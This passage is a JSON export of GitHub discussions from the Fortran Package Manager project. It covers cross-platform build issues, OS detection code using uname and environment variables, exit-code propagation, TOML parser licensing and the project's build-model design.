                    "text": "I just checked why the CMake build for Windows (VS C++ and Intel\nFortran) doesn't produce a test executable. The generated command to\nlink the program reads:\n\nC:/Program Files\n(x86)/IntelSWTools/compilers_and_libraries_2018.5.274/windows/bin/intel64/ifort.exe\n     -shared-intel @CMakeFiles\\stdlib_test.dir\\objects1.rsp -o\nstdlib_test.exe  user32.lib\n\nThe spaces in this command cause it to be interpreted as a command\n\"C:/Program\" - and of course, there is no such command.\n\nThe odd thing is that for the compile steps in the same generated file\n(build.make) use the \"short name\":\n\nC:\\PROGRA~2\\INTELS~1\\COMPIL~1.274\\windows\\bin\\intel64\\ifort.exe @<<\n...\n\nI have no idea why CMake is doing this. An examination of the *.cmake\nfiles does not give any clue. It may be better to leave the compiler\nidentification to the CMake installation altogether. I will experiment\nwith that.\n\nRegards,\n\nArjen\n\nOp wo 2 sep. 2020 om 11:25 schreef Arjen Markus <arjen.markus895@gmail.com>:\n\u2026\n\n Hi Milan, Martin,\n\n I checked my notes, there were a few things that did not quite work:\n They concern details of how Windows works (drives as a separate part\n of the file name), the MinGW environment posed some issues etc.\n Also the test program is a trifle unixy - \"/home\", \"/bin\" are\n directories not normally encountered on Windows. So, yes, this\n requires some attention. The basics work.\n I will pick this up in the coming few days.\n\n Regards,\n\n Arjen\n\n Op di 1 sep. 2020 om 17:02 schreef Milan Curcic ***@***.***>:\n >\n > @arjenmarkus Do you know the status of MarDiehl/stdlib_os regarding Windows? We discussed this briefly on the last call and as I understood from @MarDiehl, Windows still needed some work. Is that correct?\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-19 22:24:38+00:00",
                    "text": "@everythingfunctional.  I put a simple CLI interface together with M_CLI2 to demonstrate an approach I think could be a good starting point. I did not include the code for making any of the other parts functional but all the command arguments are parsed and displayed in the unimplemented subcommands for demonstration purposes. Since it only takes a few lines in everything except the fpm_command_line.f90 file it could easily be replaced later, but it seems easier to me to discuss the CLI from the perspective of a prototype.  Did you have a chance to look at any of the listed interfaces?\nNow that the TOML interface is in I think we can get a version that works on local files pretty quickly and it would be good to have the CLI in place to be able to pass options to run and test and new.\nDoes anyone have any ideas on whether there are existing utilities that can be depended on for dependencies or are people envisioning something totally in fortran, perhaps starting with daglib?\nIs libcurl common enough on non-POSIX systems to be looking at using the fortran-libcurl interface?  I have my own preprocessor and used that to jazz up my $INCLUDE directive on Redhat 8 and CygWin and it has worked very nicely\n(even the Fortran standard does not say the argument of an INCLUDE statement has to be a file on the current platform, but I do not know of one that lets you grab a file with https: or ftp: -- it is actually pretty handy).\nThe new subcommand would be a lot easier if there were a mkdir and a chdir function. Since gfortran has a lot of system extensions (as do most modern Fortran compilers if not all) having the arguments available would let that command be completely functional, at least up to the level of the Haskell fpm(1). Is if fair to use the extensions (assuming a CLI is in place, as most of new requires parameters to be implimented). I thought I saw were someone was working on new but cannot find it; but I am sure it would need CLI parameters."
                }
            ]
        },
        {
            "number": 150,
            "user": "everythingfunctional",
            "date": "2020-07-25 20:13:20+00:00",
            "title": "Propogate exit codes from tests and executables",
            "text": "Fix #143",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-25 21:06:41+00:00",
                    "text": "+1 to merge. I don't have time right now to test it, but the change looks good.\n\nEventually we have to add tests for all these things.\n\u2026\nOn Sat, Jul 25, 2020, at 2:47 PM, Milan Curcic wrote:\n\n\n ***@***.**** approved this pull request.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#150 (review)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWE4ZBYFMVPNLA4BNKLR5NAGRANCNFSM4PHTX5DA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-26 20:53:23+00:00",
                    "text": "I tried it out a couple of different ways and it worked, so I'm going to go ahead and merge."
                }
            ]
        },
        {
            "number": 149,
            "user": "milancurcic",
            "date": "2020-07-24 18:18:32+00:00",
            "title": "TOML parser",
            "text": "Part of #136\nI found 2, both support TOML v0.5 spec:\n\ntoml-f which is pure Fortran, but unfortunately GPLv3-licensed. We could ask the author to offer a more permissive license beside GPL.\nf_tomlc99 which interfaces a C parser. MIT-licensed.\n\nSo each presents an integration challenge.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-24 19:45:25+00:00",
                    "text": "In terms of easiness of use, we should try to stick to pure Fortran packages for fpm dependencies, since the non Fortran dependencies must be built somehow on all platforms for all users, and that can get messy --- we discussed just loading such packages from Conda as binaries on all platforms, which I think is preferable, but I was hoping to integrate with Conda in the Fortran fpm, and not worry about it for haskell fpm.\nAs such, we can probably quite easily improve haskell fpm to be able to compile C or C++ files inside an fpm package if we have to. But 3rd party non-Fortran dependencies will cause more issues I feel.\nConclusion: We have to tackle robust building / using of non Fortran dependencies, but I would worry about it a bit later, once Fortran fpm works well. So I would just stick to pure Fortran for now."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 19:58:23+00:00",
                    "text": "I asked the author of toml-f at awvwgk/toml-f#1 if he would be willing to relicence. If he would, that would be awesome, I think it's exactly what we are looking for."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-20 15:59:54+00:00",
                    "text": "It looks like toml-f will indeed be re-licensed to dual MIT/Apache-2.0 in an upcoming PR: awvwgk/toml-f#2. I notice this PR also includes an fpm.toml (though it relies on meson currently)."
                }
            ]
        },
        {
            "number": 148,
            "user": "milancurcic",
            "date": "2020-07-24 16:57:00+00:00",
            "title": "fpm command placeholders and expand help message",
            "text": "To warm up my Fortran fingers before the workday, I made a few benign UI improvements:\n\nExpand the print message, borrowing from fpm-haskell and Cargo\nAdd placeholder new, install, run, test commands and \"not implemented\" messages",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-24 18:04:10+00:00",
                    "text": "What GFortran version do you have? I have 7.5.0 and it returns a non zero exit value, as can be verified by:\n~/.../fpm/fpm(master)$ ./fpm \n Fortran Package Manager (fpm)\n OS Type: Linux\n~/.../fpm/fpm(master)$ echo $?\n0\n~/.../fpm/fpm(master)$ ./fpm xx\n Unknown command: xx                                                                                                  \nERROR STOP \n\nError termination. Backtrace:\n#0  0x7fd711f9b32a\n#1  0x7fd711f9bed5\n#2  0x7fd711f9cf86\n#3  0x555e59a321c7\n#4  0x555e59a32273\n#5  0x7fd711bb0b96\n#6  0x555e59a31fd9\n#7  0xffffffffffffffff\n~/.../fpm/fpm(master)$ echo $?\n1"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-24 18:07:42+00:00",
                    "text": "@LKedward I don't remember if we discussed fpm help, but it will sure be useful to display command-specific help messages, e.g. fpm help build (Cargo has it).\n@certik Never mind, now I can't reproduce it, which means that I mistakenly tested the exit code of something else that had it as 0. Are you fine with explicit error stop 1 or should I revert that one? I think at least this way the code will be consistent across compilers, if it's not already."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 18:11:52+00:00",
                    "text": "I don't mind what is in there, as it will get rewritten anyway eventually. I only don't like your commit message, as it implies that somehow error stop is bad, while my understanding of it is that it will always exit the program with non zero exit code."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-24 18:28:48+00:00",
                    "text": "@certik Now I'm confused. Does \"add exit code to error stop\" imply that it's bad? It merely states what was added to the code.\nBut more importantly, do you not think that error stop 1 is more robust than error stop? The standard recommends that error stop causes a non-zero exit code, so I think we can confidently trust that all compilers will do that. However, I don't know what error codes various compilers return, so even after the fact about my mistake I think this is an improvement."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 19:38:57+00:00",
                    "text": "I think you posted it in the comment not a commit log, my apologies. It's fine to merge as it is, so I am going to merge it.\nI am not sure if error stop 1 is more robust than error stop, unless you care about the value of the non zero code."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-24 19:43:58+00:00",
                    "text": "@certik Ah, okay, got it, all clear now. I agree, that comment was a mistake. I went back and crossed it over so it doesn't confuse anybody else.\nYes for explicit error stop code it will matter only when we want to set different codes. As you say, these are just placeholders so it doesn't matter for now."
                }
            ]
        },
        {
            "number": 147,
            "user": "certik",
            "date": "2020-07-22 22:19:30+00:00",
            "title": "Execute the newly built fpm",
            "text": "On all platforms.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-23 16:08:34+00:00",
                    "text": "This is just a simple addition to the CI, tests work, I am going to merge it."
                }
            ]
        },
        {
            "number": 146,
            "user": "certik",
            "date": "2020-07-22 21:07:45+00:00",
            "title": "Design a model that captures fpm's understanding of the project",
            "text": "The Fortran fpm should have a module that represents the semantics of all the information that fpm gathers about the project. Here is the pipeline of fpm build:\n\n\nParse: read fpm.toml, read src/*, read app/* (later also tests/*, examples/*, ...), read every Fortran file, determine if it is a program or a module, note module / program name, note all Fortran module dependencies.\n\n\nSemantics: checks that all the information is consistent: that module / program name is consistent with the filename, that module and package dependencies are present, that info in fpm.toml is consistent with the files that are present. In this phase we check for all errors and report nice error messages to the user if something is wrong. After this phase is over, the project is correct and can be compiled (there can be compiler error messages later on, but no fpm error messages).\n\n\nModel: The result of the phase 2. is saved in a standalone representation that we should be able to print out. This representation has all the information that later phases will require. And it is checked, in other words, all fpm errors are already reported. It is possible to print this representation out. I can imagine a lot of our tests can simply be to run fpm build --show-model that will only print the model out, but not do any build, and we check it against reference results, to ensure that fpm was able to gather and check all the information correctly.\n\n\nBackends:\na. Build backend: takes the Model (and nothing else) and builds the project\nb. CMake backend: takes the Model (and nothing else) and generates a CMake build system (#69) or a standalone tarball with all dependencies and a CMake build system (#123).\n\n\nThis design will ensure that the initially possibly messy and error prone parts in 1. and 2. are completely separated from the actual build or cmake backends, and that we can test each part separately. Also, even for our users it would be very helpful if fpm can print the Model in a nice form, so that users can check that fpm was able to understand their project correctly, before attempting to do any build. If the Model is not what users expected, then they know that fpm didn't understand their project correctly and they can report a bug, or rearrange their files or fpm.toml.\n\n@milancurcic, @everythingfunctional let me know if you want to do a quick phone call about this.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 21:17:02+00:00",
                    "text": "Regarding package dependencies: to have a complete Model without any missing Fortran modules, one might need to checkout every dependency (recursively) and execute 1. and 2. on it, to figure out what Fortran modules the dependency has, and then one can ensure that there are (globally) no missing modules.\nSo executing 1. and 2. on a given package will create a Model with possible missing Fortran modules. But downloading & executing 1. and 2. on each dependency (before building) we can construct a Model for each package and ensure that all the Models are consistent.\nSo part of the Model can be a structure like Package, and a full Model would then have a set of Packages with dependencies between them, etc. This full Model will then be an input to #123. Also one can then use this full Model to design a good parallel Build backend.\n\nI think from a practical perspective, it makes sense if a Model's Package structure is constructed locally for a given package, and checked for everything except missing Fortran modules. This can then be (even in parallel) repeated for each dependency, as this process is independent of order. Finally, at the end, this set of Packages is taken and checked that all missing modules resolve correctly according to the Package dependencies, and this resolved set of Packages then comprises the finished Model as part of step 3. Then one can hand it over to the backends  in 4.\nEach Package would know where on the disk the files are checked out. So when the backends in 4. start the work, no internet connection is needed, everything is checked out.\nThe only possible improvement is to start building while other packages are still downloading, but that's going to mess up the separation of things, so we might want to do it like Debian/Ubuntu, which first downloads all packages, and only then installs them in the correct order. So besides this very minor lack of optimization, this seems like a very clean design, that will allow us to maintain clean code and be very transparent to users."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-23 19:18:13+00:00",
                    "text": "@certik , I think this is a very good design. There are some details to flesh out (obviously), but this is quite similar to the way it's done in the Haskell version.\nI might add a step 0, parse the command line, as some commands do not require reading the fpm.toml or doing all (or even any) of the following steps. fpm new for example.\nWe probably should schedule a call. I'm swamped today and tomorrow, but should be able to squeeze it some time after that."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-23 19:27:30+00:00",
                    "text": "It looks good, I'm down for a call next week. Please email a few time slots for next week. It'd be good to also entrain anybody who's interested in getting more involved with fpm development."
                },
                {
                    "user": "certik",
                    "date": "2020-07-23 23:33:50+00:00",
                    "text": "Ok, the call is set for Tuesday 1pm PDT. If anyone else wants to join this discussion, you can, just comment here so that we can invite you."
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-24 09:59:53+00:00",
                    "text": "I'm interested in getting more involved with fpm development so would be interested in joining that call."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-24 10:07:28+00:00",
                    "text": "Same here :).\n\nOp vr 24 jul. 2020 om 12:00 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n I'm interested in getting more involved with fpm development so would be\n interested in joining that call.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#146 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5XJRXIPRZBWFSRA5LR5FLSRANCNFSM4PFDFI3Q>\n ."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 15:33:45+00:00",
                    "text": "@LKedward, @arjenmarkus perfect, thanks. I will post the meeting information here, so that you can join also."
                },
                {
                    "user": "certik",
                    "date": "2020-07-28 17:36:26+00:00",
                    "text": "Here is the Zoom meeting invitation at 1pm Pacific Time today.\nOnd\u0159ej \u010cert\u00edk is inviting you to a scheduled Zoom meeting.\nTopic: FPM Design Discussion\nTime: Jul 28, 2020 02:00 PM Mountain Time (US and Canada)\nJoin Zoom Meeting\nhttps://zoom.us/j/99897479516?pwd=UnpBL05la3YyYmVSdEo1T0VSVmJwUT09\nMeeting ID: 998 9747 9516\nPasscode: YY1XEv"
                },
                {
                    "user": "certik",
                    "date": "2020-07-28 19:57:18+00:00",
                    "text": "Just a reminder that the meeting starts in 3 minutes."
                },
                {
                    "user": "certik",
                    "date": "2020-07-28 21:13:15+00:00",
                    "text": "Summary of our meeting:\n\nLooks like we all agreed on the general design above.\nWe discussed some details such as:\n\nHow to test this: integration tests vs unit tests, vs integration tests with specific features to test. We will iterate as we go. We can use Vegetables for unit testing.\nHow to link C dependencies: include the linking information in the Model, backend links\nThe Model includes everything, including command line options\nAllow the Model to print to the screen (for testing and informational purposes)\nThat it is probably a good idea as a start to download all dependencies and figure out a Model that includes all the dependencies, and only then pass it over to the backend. Later we can investigate whether the backend cannot start building some files speculatively sooner.\n\n\nStep forward: refactor our current fpm to follow the design above: construct a Model, pass it to the backend."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-29 06:40:54+00:00",
                    "text": "Hi Ondrej, all,\n\nsorry I missed the meeting - I was home rather late and I did not see any\nmessage with a link to the meeting ;). I will try and catch up with the\nmaterial so far.\n\nRegards,\n\nArjen\n\nOp di 28 jul. 2020 om 23:13 schreef Ond\u0159ej \u010cert\u00edk <notifications@github.com\n\u2026\n:\n Summary of our meeting:\n\n    - Looks like we all agreed on the general design above.\n    - We discussed some details such as:\n       - How to test this: integration tests vs unit tests, vs integration\n       tests with specific features to test. We will iterate as we go. We can use\n       Vegetables for unit testing.\n       - How to link C dependencies: include the linking information in\n       the Model, backend links\n       - The Model includes everything, including command line options\n       - Allow the Model to print to the screen (for testing and\n       informational purposes)\n       - That it is probably a good idea as a start to download all\n       dependencies and figure out a Model that includes all the dependencies, and\n       only then pass it over to the backend. Later we can investigate whether the\n       backend cannot start building some files speculatively sooner.\n    - Step forward: refactor our current fpm to follow the design above:\n    construct a Model, pass it to the backend.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#146 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRZLWWNL4YBLV3QGJIDR545PVANCNFSM4PFDFI3Q>\n ."
                },
                {
                    "user": "certik",
                    "date": "2020-07-29 06:58:40+00:00",
                    "text": "No worries! I am sure we'll have another development meeting soon.\n\u2026\nOn Wed, Jul 29, 2020, at 12:41 AM, Arjen Markus wrote:\n\n\n Hi Ondrej, all,\n\n sorry I missed the meeting - I was home rather late and I did not see any\n message with a link to the meeting ;). I will try and catch up with the\n material so far.\n\n Regards,\n\n Arjen\n\n Op di 28 jul. 2020 om 23:13 schreef Ond\u0159ej \u010cert\u00edk ***@***.***\n >:\n\n > Summary of our meeting:\n >\n > - Looks like we all agreed on the general design above.\n > - We discussed some details such as:\n > - How to test this: integration tests vs unit tests, vs integration\n > tests with specific features to test. We will iterate as we go. We can use\n > Vegetables for unit testing.\n > - How to link C dependencies: include the linking information in\n > the Model, backend links\n > - The Model includes everything, including command line options\n > - Allow the Model to print to the screen (for testing and\n > informational purposes)\n > - That it is probably a good idea as a start to download all\n > dependencies and figure out a Model that includes all the dependencies, and\n > only then pass it over to the backend. Later we can investigate whether the\n > backend cannot start building some files speculatively sooner.\n > - Step forward: refactor our current fpm to follow the design above:\n > construct a Model, pass it to the backend.\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub\n > <#146 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAN6YRZLWWNL4YBLV3QGJIDR545PVANCNFSM4PFDFI3Q>\n > .\n >\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#146 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWBXYJLYFELAQTY7UT3R57AAHANCNFSM4PFDFI3Q>."
                }
            ]
        },
        {
            "number": 145,
            "user": "certik",
            "date": "2020-07-22 20:10:35+00:00",
            "title": "Read the source files automatically",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 20:43:05+00:00",
                    "text": "This obviously needs a lot more testing, but as a proof of concept it's good enough. It reads the files from the src/ directory if it exists and builds them. It seems to work on all platforms. Still no module dependency resolution."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 21:30:42+00:00",
                    "text": "I rebased on top of the latest master to simplify the history."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 22:17:30+00:00",
                    "text": "Thanks for the review. Merging."
                }
            ]
        },
        {
            "number": 144,
            "user": "certik",
            "date": "2020-07-22 15:03:08+00:00",
            "title": "fpm should detect operating system",
            "text": "Given the issues in #141 to determine the OS type, I think the most robust is to do it like CMake: fpm will detect / know the operating system that it is on, and it will pass this information down the source files, for example in terms of macro definitions, such as:\n\nFPM_OS_LINUX\nFPM_OS_MACOS\nFPM_OS_WINDOWS\n\nOr something like that. We might be even more specific than that if needed. This seems to be the most robust and cross-platform way to do it that will work with all Fortran compilers.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 15:11:20+00:00",
                    "text": "I tried various ways using macros in #142, and none of them seem to work with gfortran. So that's why I think having fpm define those macros is the way to go."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 15:16:58+00:00",
                    "text": "Right, so if fpm itself can detect the operating system, what do you need the macros for? I thought the macros are only useful when your software doesn't have the information you need. Or am I missing something?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:23:55+00:00",
                    "text": "It's a chicken and an egg. The fpm implementation in Fortran needs to know the system type so that we know what command to use to get the directory content. The most robust seems to be if the build system (whether cmake or fpm) passes this information in as macro definitions."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 15:31:07+00:00",
                    "text": "Okay, so the bootstrap Haskell fpm will know the OS and pass the macros down to Fortran fpm. Then in the future when you want to bootstrap Fortran fpm using Fortran fpm, then the OS information will already be available in the boostrap Fortran fpm binary. It made me dizzy for a little bit, but I think it works."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:34:47+00:00",
                    "text": "Right. The other way to bootstrap fpm down the road will be via cmake (#123), so the cmake build system that fpm will generate will have to detect the OS type (which cmake knows how to do) and then create the proper FPM_OS_* macro defines."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 11:50:39+00:00",
                    "text": "You could use the commands that come with the operating system (for instance this website gives some indicators.\nWhile this will not be waterproof, the module may simply test the various commands - whichever succeeds is the one we want.\nI can give this a try."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 12:32:31+00:00",
                    "text": "I just tried:\nver in a Windows command box gives the indication of the Windows version\nThis does not work with MinGW or Cygwin, even though they are Windows-based OSes.\nuname -a succeeds on MinGW, Cygwin and Linux with proper indications of all OS types.\nI have no access to MacOS but I imagine that uname -a work fine there as well.\n(Something to check: whether ver is not a haphazard program - for uname I guess /usr/bin/uname is restrictive enough?)"
                },
                {
                    "user": "certik",
                    "date": "2020-07-23 14:59:22+00:00",
                    "text": "Here is how we currently do this using environment variables: \n  \n    \n      fpm/fpm/src/fpm.f90\n    \n    \n         Line 16\n      in\n      6ef2546\n    \n    \n    \n    \n\n        \n          \n           integer function get_os_type() result(r)"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 17:16:20+00:00",
                    "text": "Hm, the environment variable HOMEPATH is set to \"\\Users\\markus\" on my Cygwin and MinGW/w-64 installations. So, with the current procedure that would boil down to \"Windows\"."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-23 17:19:54+00:00",
                    "text": "It looks like we may have to combine the current HOMEPATH query with a ver test suggested by @arjenmarkus if we want to differentiate MinGW or Cygwin from Windows."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 17:23:10+00:00",
                    "text": "Since they represent very different operating environments, I think we\ncannot ignore the difference ;). For instance: \"dir\" does not work under\nCygwin or MinGW.\n\nRegards,\n\nArjen\n\nOp do 23 jul. 2020 om 19:20 schreef Milan Curcic <notifications@github.com>:\n\u2026\n It looks like we may have to combine the current HOMEPATH query with a ver\n test suggested by @arjenmarkus <https://github.com/arjenmarkus> if we\n want to differentiate MinGW or Cygwin from Windows.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#144 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR2ZDUGZDNVZCMXWNUDR5BWMXANCNFSM4PEZSOMQ>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 17:26:10+00:00",
                    "text": "Oops, I was too hasty: \"dir\" does actually work and \"dir -b\" also. But then\n\"dir /b\" does not and, vice versa, under a Windows command box \"dir -b\"\ndoes not work - it looks for a file \"-b\".\n\nRegards,\n\nArjen\n\nOp do 23 jul. 2020 om 19:22 schreef Arjen Markus <arjen.markus895@gmail.com\n\u2026\n:\n Since they represent very different operating environments, I think we\n cannot ignore the difference ;). For instance: \"dir\" does not work under\n Cygwin or MinGW.\n\n Regards,\n\n Arjen\n\n Op do 23 jul. 2020 om 19:20 schreef Milan Curcic ***@***.***\n >:\n\n> It looks like we may have to combine the current HOMEPATH query with a\n> ver test suggested by @arjenmarkus <https://github.com/arjenmarkus> if\n> we want to differentiate MinGW or Cygwin from Windows.\n>\n> \u2014\n> You are receiving this because you were mentioned.\n> Reply to this email directly, view it on GitHub\n> <#144 (comment)>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AAN6YR2ZDUGZDNVZCMXWNUDR5BWMXANCNFSM4PEZSOMQ>\n> .\n>"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-23 17:34:15+00:00",
                    "text": "Right, dir is part of GNU Coreutils, so it works on most Linux systems, but not on macOS for example. Best to stay away from it for making important decisions :)."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 18:25:21+00:00",
                    "text": "I have experimented a bit: the attached code correctly identifies the\nfour OSes I have access to. It cannot rely on \"ver\", because that is\nalso supported by MinGW and Cygwin, so instead I use \"uname\". However,\nMinGW gives odd results - /usr/bin/uname was not found (presumably the\ndirectory is not properly substituted). So, it also tries \"uname\"\nwithout the path.\n\nThe executable I created with Intel Fortran gives the right (!)\nidentification under a Windows command box, MinGW and Cygwin. I have\nnot tested the MinGW/Cygwin variants under the others.\n\n(Attaching it to an email was the fastest way, but of course I can\nalso put it in a pull request)\n\nRegards,\n\nArjen\n\nOp do 23 jul. 2020 om 19:34 schreef Milan Curcic <notifications@github.com>:\n\n Right, dir is part of GNU Coreutils, so it works on most Linux systems, but not on macOS for example. Best to stay away from it for making important decisions :).\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe.\n! getos.f90 --\n!     Attempt to characterise the operating system\n!\nmodule getos\n    implicit none\n\n    integer, parameter :: OS_WINDOWS = 1\n    integer, parameter :: OS_LINUX   = 2\n    integer, parameter :: OS_MACOS   = 3\n    integer, parameter :: OS_CYGWIN  = 4\n    integer, parameter :: OS_MINGW   = 5\n\ncontains\n\n! get_os --\n!     Identify the operating system\n!\n! Arguments:\n!     None\n!\n! Note:\n!     Linux is used as the fallback option. Should we distinguish this from a positive identification?\n!\ninteger function get_os()\n    character(len=80) :: val\n    character(len=20) :: os_id\n    integer           :: lun\n    integer           :: stat\n\n    !\n    ! Try the environment variable\n    !\n    call get_environment_variable( \"HOMEPATH\", val, status = stat )\n\n    if ( stat == 0 .and. val(1:7) == \"\\Users\\\" ) then\n        !\n        ! We may be on Windows, probably, but what flavour? Windows, Cygwin or MinGW?\n        !\n        ! First try \"uname\"\n        !\n        ! Note: MinGW gives an error when using the full path ...\n        !\n        call execute_command_line( \"/usr/bin/uname -a > fpm_tmp.out 2>&1\", exitstat = stat )\n        if ( stat /= 0 ) then\n            call execute_command_line( \"uname -a > fpm_tmp.out 2>&1\", exitstat = stat )\n        endif\n\n        if ( stat /= 0 ) then\n            !\n            ! This seems to be Windows\n            !\n            get_os = OS_WINDOWS\n        else\n            open( newunit = lun, file = \"fpm_tmp.out\" )\n            read( lun, * ) os_id\n            close( lun, status = 'delete' )\n\n            get_os = merge( OS_CYGWIN, OS_MINGW, os_id(1:6) == 'CYGWIN' )\n        endif\n    else\n        !\n        ! We are on Linux or MacOS\n        !\n        call get_environment_variable( \"HOME\", val, status = stat )\n\n        if ( stat == 0 ) then\n            if ( val(1:7) == \"/Users/\" ) then\n                get_os = OS_MACOS\n            else\n                get_os = OS_LINUX\n            endif\n        else\n            !\n            ! Use Linux as fallback option\n            !\n            get_os = OS_LINUX\n        endif\n    endif\nend function get_os\n\nend module getos\n\n! test ...\n!\nprogram test_get_os\n    use getos\n\n    integer :: id\n\n    character(len=10), dimension(5) :: os_identification = &\n        ['Windows   ', 'Linux     ', 'MacOS     ', 'Cygwin    ', 'MinGW     ']\n\n    id = get_os()\n    write(*,*) id, os_identification(id)\n\nend program test_get_os"
                },
                {
                    "user": "certik",
                    "date": "2020-07-23 23:37:46+00:00",
                    "text": "Thanks @arjenmarkus, much appreciated. We should incorporate this into fpm."
                }
            ]
        },
        {
            "number": 143,
            "user": "certik",
            "date": "2020-07-22 14:41:32+00:00",
            "title": "`fpm run` does not propagate exit code",
            "text": "fpm run does not return with error if the program fails, as can be checked by:\n$ fpm run && echo \"OK\"\nERROR STOP \n\nError termination. Backtrace:\n#0  0x7ff9ae8262ed in ???\n#1  0x7ff9ae826ed5 in ???\n#2  0x7ff9ae827f86 in ???\n#3  0x55ee5e99e013 in get_os\n\tat src/fpm.F90:22\n#4  0x55ee5e99df25 in __fpm_MOD_print_help\n\tat src/fpm.F90:28\n#5  0x55ee5e99daa2 in MAIN__\n\tat app/main.f90:7\n#6  0x55ee5e99dc43 in main\n\tat app/main.f90:2\nOK\n\nThis causes CI tests to pass even though they should fail, e.g.:\nhttps://github.com/fortran-lang/fpm/pull/142/checks?check_run_id=897192409\nwhich should have failed, but happily continues:\n...\n# gfortran (for build/gfortran_debug/app/main.o)\n# gfortran (for build/gfortran_debug/app/fpm)\n+ fpm run\nERROR STOP \n\nError termination. Backtrace:\n#0  0x7fc9615aaaed in ???\n#1  0x7fc9615ab605 in ???\n#2  0x7fc9615acc93 in ???\n#3  0x55b23ed92014 in get_os\n\tat src/fpm.F90:22\n#4  0x55b23ed91f21 in __fpm_MOD_print_help\n\tat src/fpm.F90:28\n#5  0x55b23ed91a7d in MAIN__\n\tat app/main.f90:7\n#6  0x55b23ed91c28 in main\n\tat app/main.f90:2\n+ fpm run --args build\n # Building project\n + gfortran -c src/fpm.F90 -o fpm.o\n + gfortran -c app/main.f90 -o main.o\n...\n\nThis is quite high priority, as we need our CI to be reliable with regards to these things.\n@everythingfunctional do you  know how to fix it?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-23 16:34:48+00:00",
                    "text": "I see. I expected the function used to run external commands to propagate that automatically, but I guess I was wrong. It should just be a matter of catching the return status and manually doing something with it. I should have some time to look into it this weekend."
                }
            ]
        },
        {
            "number": 142,
            "user": "certik",
            "date": "2020-07-22 05:24:08+00:00",
            "title": "Initial implementation of get_os()",
            "text": "It might be difficult to get this working via pre-processor.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 14:43:10+00:00",
                    "text": "This PR actually fails tests, but they look like they passed due to #143."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:07:46+00:00",
                    "text": "@milancurcic the tests are currently failing, even though they are green. The macros do not work, if you click on the output when we just run fpm, you can see that you get a stacktrace and \"error stop\"."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:09:06+00:00",
                    "text": "The latest commit prints os type 1 (Linux) on all platforms. Ok, I think the macros do not work at all. I am going to use an alternative implementation using environment variables."
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-22 15:28:47+00:00",
                    "text": "The latest commit prints os type 1 (Linux) on all platforms. Ok, I think the macros do not work at all. I am going to use an alternative implementation using environment variables.\n\nHow did you pass the macro to gfortran? as -DFMP_OS_xxxx?"
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-22 15:39:56+00:00",
                    "text": "The latest commit prints os type 1 (Linux) on all platforms. Ok, I think the macros do not work at all. I am going to use an alternative implementation using environment variables.\n\nIf it could help, fpp and macros seem to work when compiling manually:\n gfortran -cpp -D_WIN32 fpm.F90\n$ ./a.out \n Fortran Package Manager (fpm)\n OS Type:            3"
                },
                {
                    "user": "certik",
